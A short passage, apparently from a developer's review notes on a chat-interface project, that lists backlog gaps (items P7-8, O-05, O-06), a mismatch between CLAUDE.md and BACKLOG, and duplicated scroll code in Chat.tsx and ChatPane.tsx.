  none of it (about 30 raw controls). CLAUDE.md says so; BACKLOG does not.
- **P7-8, partial.** The O-05 and O-06 gaps.
- Also noted: the stick-to-bottom scroll is written twice (`Chat.tsx`, `ChatPane.tsx`).
